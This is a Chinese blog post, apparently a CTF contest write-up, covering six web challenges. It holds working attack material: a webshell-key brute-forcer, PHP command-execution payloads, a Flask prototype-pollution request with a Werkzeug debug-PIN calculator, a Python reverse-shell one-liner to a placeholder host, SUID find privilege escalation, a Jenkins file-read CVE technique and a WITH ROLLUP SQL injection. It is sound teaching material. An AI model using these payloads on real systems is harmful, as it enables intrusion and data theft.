@@ -1,0 +1,310 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Chive ctf校赛wp-nanamo版本-WEB | Nanamo - 纯纯的二刺螈</title><meta name="author" content="Nanamo,2414899528@qq.com"><meta name="copyright" content="Nanamo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Hacker ouT!签到题目, 想办法修改cookie的user为admin就可以了办法太多了, 直接devtools解决最简单 冷冽谷的哥斯拉题目不算太难, 但是可能大部分人没有见过所以不太好做 首先扫了一下网页, 没找到啥有用的, 先用dirsearch扫一遍访问shell.jsp, ctrl+u查看源码有了解过的应该能看出来这个是一个魔改的哥斯拉🐎, 格式是jsp base64, 给出的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chive ctf校赛wp-nanamo版本-WEB">
+<meta property="og:url" content="https://utahamo.github.io/2024/04/14/%E6%A0%A1%E8%B5%9Bwp-nanamo%E7%89%88%E6%9C%AC-WEB/index.html">
+<meta property="og:site_name" content="Nanamo - 纯纯的二刺螈">
+<meta property="og:description" content="Hacker ouT!签到题目, 想办法修改cookie的user为admin就可以了办法太多了, 直接devtools解决最简单 冷冽谷的哥斯拉题目不算太难, 但是可能大部分人没有见过所以不太好做 首先扫了一下网页, 没找到啥有用的, 先用dirsearch扫一遍访问shell.jsp, ctrl+u查看源码有了解过的应该能看出来这个是一个魔改的哥斯拉🐎, 格式是jsp base64, 给出的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230027875.gif">
+<meta property="article:published_time" content="2024-04-14T12:42:58.130Z">
+<meta property="article:modified_time" content="2024-04-14T12:45:08.550Z">
+<meta property="article:author" content="Nanamo">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Safety">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Cve">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230027875.gif"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230022722.jpg"><link rel="canonical" href="https://utahamo.github.io/2024/04/14/%E6%A0%A1%E8%B5%9Bwp-nanamo%E7%89%88%E6%9C%AC-WEB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Chive ctf校赛wp-nanamo版本-WEB',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-14 20:45:08'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Nanamo - 纯纯的二刺螈" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-04/202404142051038.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 轴子</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 相关</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230027875.gif')"><nav id="nav"><span id="blog-info"><a href="/" title="Nanamo - 纯纯的二刺螈"><span class="site-name">Nanamo - 纯纯的二刺螈</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 轴子</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 相关</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Chive ctf校赛wp-nanamo版本-WEB</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-14T12:42:58.130Z" title="发表于 2024-04-14 20:42:58">2024-04-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-14T12:45:08.550Z" title="更新于 2024-04-14 20:45:08">2024-04-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Chive ctf校赛wp-nanamo版本-WEB"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Hacker-ouT"><a href="#Hacker-ouT" class="headerlink" title="Hacker ouT!"></a>Hacker ouT!</h2><p>签到题目, 想办法修改<code>cookie</code>的<code>user</code>为admin就可以了<br>办法太多了, 直接<code>devtools</code>解决最简单</p>
+<h2 id="冷冽谷的哥斯拉"><a href="#冷冽谷的哥斯拉" class="headerlink" title="冷冽谷的哥斯拉"></a>冷冽谷的哥斯拉</h2><p>题目不算太难, 但是可能大部分人没有见过所以不太好做</p>
+<p>首先扫了一下网页, 没找到啥有用的, 先用<code>dirsearch</code>扫一遍<br><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-04/202404092006278.png" alt="image.png"><br>访问<code>shell.jsp</code>, <code>ctrl+u</code>查看源码<br>有了解过的应该能看出来这个是一个魔改的哥斯拉🐎, 格式是<code>jsp base64</code>, 给出的</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">xxxx</span> <span class="operator">=</span> <span class="string">&quot;ffe3f468070ae0da&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">pppp</span> <span class="operator">=</span> <span class="string">&quot;Noz0m1&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>应该就是原始哥斯拉🐎中的</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String xc=<span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line">String pass=<span class="string">&quot;pass&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>哥斯拉连接需要<code>pass</code>和<code>key</code>, <code>pass</code>就是<code>Noz0m1</code><br>通读一下, 文件就是做了一下混淆, 没有动别的配置, 所以接下来, 我们需要拿到<code>key</code>, 这里需要了解一下哥斯拉🐎的生成机制, 这里直接给出, 文件中的<code>ffe3f468070ae0da</code>是<code>key</code>经过<code>md5</code>后的前16位, 所以下一步我们可以直接尝试爆破, 让gpt写了一个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的MD5密文前16位</span></span><br><span class="line">known_prefix = <span class="string">&quot;ffe3f468070ae0da&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_md5</span>(<span class="params">known_prefix</span>):</span><br><span class="line">    characters = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历明文长度从1到6</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>):</span><br><span class="line">        <span class="comment"># 生成所有长度为length的明文组合</span></span><br><span class="line">        <span class="keyword">for</span> combination <span class="keyword">in</span> itertools.product(characters, repeat=length):</span><br><span class="line">            plain_text = <span class="string">&#x27;&#x27;</span>.join(combination)</span><br><span class="line">            full_hash = hashlib.md5(plain_text.encode()).hexdigest()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\rCurrent plaintext: <span class="subst">&#123;plain_text&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果前16位匹配，则输出结果</span></span><br><span class="line">            <span class="keyword">if</span> full_hash[:<span class="number">16</span>] == known_prefix:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\nFound matching plain text:&quot;</span>, plain_text)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Full MD5 hash:&quot;</span>, full_hash)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Starting MD5 cracking...&quot;</span>)</span><br><span class="line">crack_md5(known_prefix)</span><br></pre></td></tr></table></figure>
+<p>稍微等一会, 能够爆出来<code>key</code>是<code>chive</code>, 用哥斯拉连接, 成功<br><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-04/202404092032419.png" alt="image.png"><br>然后进去<code>cat /flag</code>拿到flag就行了</p>
+<h2 id="php-tricks"><a href="#php-tricks" class="headerlink" title="php_tricks"></a>php_tricks</h2><p>借鉴了知识星球的题目, 之前和某xyctf出题师傅讨论过, 所以拿来出题了<br>(后来发现貌似考点2flag.php忘记加显示源码了, 所以就当没有算了(-&lt;-)</p>
+<p>题目意思很简单, 接收get参数和post参数, get参数构成<code>call_user_func</code>的两个参数, post参数构成可变函数</p>
+<p>思路是找到合适的回调函数, 将最后一层构造成诸如<code>system(&#39;ls&#39;)</code>这样的格式<br>下一步是构造外面一层, 也就是构造<code>call_user_func</code>回调函数, </p>
+<p>我的思路如下, 因为<code>$parameters</code>变量是一个数组, 所以利用<code>array_key_first</code>取出了数组的第一个key也就是<code>utf8_decode</code><br><code>utf8_decode($_POST[&#39;a&#39;])</code>对我输入的a并不会产生什么影响, 结果就是<code>system</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fyuction=array_key_first&amp;utf8_decode=1</span><br><span class="line">post: a=system&amp;b=ls</span><br></pre></td></tr></table></figure>
+<p>另一个师傅思路如下, <code>current</code>默认是数组的第一项, 后面思路就一样了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fyuction=current&amp;a=current</span><br><span class="line">post:a[]=system&amp;b=whoami</span><br></pre></td></tr></table></figure>
+
+<p>比较easy~</p>
+<h2 id="iT’s-MyPin"><a href="#iT’s-MyPin" class="headerlink" title="iT’s MyPin"></a>iT’s MyPin</h2><p>比较麻烦, 但是不难的一个题目</p>
+<p>首先题目给出了源码, (不方便阅读就ctrl+u看源码)仔细阅读之后, 发现<code>debug=True</code>开启了flask的debug模式, 这个经常考到算pin码rce</p>
+<p>在<code>/api</code>路由中, 有个典型的merge函数, 做过题目的应该知道是<code>原型链污染</code>的一个标志了, 没做过的搜一下这个奇怪的函数也很容易搜到, 结构我是没有修改的, 这里是将post传入的数据merge给了instance, 这样做实际上我们可以构造请求体来控制任意变量, 下面有个<code>__file__</code>正好被读取了, 可以试着修改这个变量来做任意文件读取</p>
+<p>格式不唯一, 具体可以查看网上关于python原型链污染的文章, 我这里用的这个</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__file__&quot;</span><span class="punctuation">:</span><span class="string">&quot;/flag&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>POST发送请求之后, 再次查看<code>/</code>路由, 发现debug页面提示报错<code>Permission denied: &#39;/flag&#39;</code><br>这里是因为我把<code>/flag</code>设置为了root用户权限, 但是flask是momo用户在运行, 读取<code>/etc/passwd</code>是可以猜到的</p>
+<p>结合之前提到的pin码, 我们试着读取一下计算pin码所需要的文件</p>
+<p>在刚才的报错界面中可以找到python版本为3.8, 高版本用sha1的计算脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;momo&#x27;</span>  <span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;156525269814096&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address 冒分16进制转10进制, 我习惯去掉冒号在devtools里面0x...直接得到</span></span><br><span class="line">    <span class="comment"># machine_id 一般 = /etc/machine-id+/proc/self/cgroup的斜杠后半段, 真机三个一起用：</span></span><br><span class="line">    <span class="comment"># 1./etc/machine-id = ea1fc30b6f4a173cea015d229c6b55b6</span></span><br><span class="line">    <span class="comment"># 2./proc/sys/kernel/random/boot_id = e1fca593-dd38-4d12-bb7e-d6bf6cde6cbb (用不到)</span></span><br><span class="line">    <span class="comment"># 3./proc/self/cgroup = cri-containerd-5500ffd3801380b91976ea5b9e0ac8b7f208ab72a99bab34af7a8fb0c99e7791.scope</span></span><br><span class="line">    <span class="comment"># 这里因为是k3s后端, 所以/proc/self/cgroup不是常见的类型, 但是格式同docker </span></span><br><span class="line">    <span class="string">&#x27;ea1fc30b6f4a173cea015d229c6b55b6cri-containerd-5500ffd3801380b91976ea5b9e0ac8b7f208ab72a99bab34af7a8fb0c99e7791.scope&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我的计算结果<code>193-344-993</code>, 在报错界面找到终端窗口或者直接访问<code>/console</code>路由, 输入pin码可以进入python终端<br><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-04/202404131302957.png" alt="image.png"></p>
+<p>然后就是这个道理了, 后面我习惯反弹shell回来, 或者你直接用下面这句也行, 这里考的就是suid提权了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.popen(<span class="string">&#x27;/usr/bin/find /flag -exec bash -p -c &quot;cat /flag&quot; \;&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p>或者反弹一个shell会更简单</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;xx.xx.xx.xx&quot;</span>,<span class="number">7210</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>当前用户是momo , 也是需要suid提权, 除了上面那句还可以用这句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /flag -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
+<p>拿下了~</p>
+<h2 id="jenkinslove"><a href="#jenkinslove" class="headerlink" title="jenkinslove"></a>jenkinslove</h2><p>简单的一道cve, 没啥太难的, 就是设置了一个小坑, flag并没有放在&#x2F;flag中, 所以需要读一下别的东西, 参考p牛的文章</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/jenkins-cve-2024-23897.html">Jenkins文件读取漏洞拾遗（CVE-2024-23897） | 离别歌</a></p>
+</blockquote>
+<p>里面提到了两种读取文件的方法, 第一种只能读取一行, 我在&#x2F;flag中的第一行写的是<br><code>nanamo_flag is not here,but ...</code></p>
+<p>如果有心的话看到下面有个匿名用户可读全部文件内容的方法, 试试这个可以得到&#x2F;flag内容是<br><code>nanamo_flag is not here,but ...  </code>maybe environ?&#96;</p>
+<p>提示读取环境变量, 这里读取有时候需要用&#x2F;&#x2F;作为i第一个&#x2F;, 注意一下就行<br>做过web的大概知道这个environ指代的是什么, 没做过的, 搜一下也很容易得到<br><code>/proc/$PID/environ</code><br>如果你用的是<code>/proc/self/environ</code>, 那是读不出来的, 因为这个容器的入口是我设置的<code>docker-entrypoint.sh</code>, flag也是在这里面进行了加载, 所以flag藏在了<br><code>/proc/1/environ</code>中</p>
+<p>其实有的ctf也会出这样的非预期解, 干脆就拿过来用了</p>
+<h2 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h2><p>这个题目后来添加了提示, 但是没做过的师傅应该还是比较雾水的<br>实际这道题是一个with rollup注入, 借鉴了<br><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/KQHBR3liu/"> Mysql with rollup注入(ISCC-2018 线下赛Web 私地一) </a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-04/202404131529950.png" alt="image.png"></p>
+<p>界面很朴素, 下面给了提示, 尝试和提示给了admin和root用户, 输入这两个用户的话是密码错误</p>
+<p><code>Executed Operations</code>中发现, 只查询了用户名, 这是比较奇怪的, 而且密码很有可能是拿<br>来和输入的密码作比较, 进行鉴权</p>
+<p>如果尝试了一句话密码, 则会爆出<code>results are more than one</code>, 所以猜测需要得到一个查询结果的密码和我们输入的密码相同才可以</p>
+<p>于是<code>with roll up</code>, 黑名单基本可以无视, 空格用<code>/**/</code>url编码后绕过即可<br>查询结果会变成一个null, 由于后台弱比较, 我们不输入密码就可以拿到flag了</p>
+<p>这道主要还是靠经验了, 原理的话推荐自己用数据库做一下实验, 可以看我上面链接的文章和自己补充网络知识</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;/**/group/**/by/**/password/**/with/**/rollup/**/limit/**/1/**/offset/**/1#&amp;password=</span></span><br></pre></td></tr></table></figure>
+
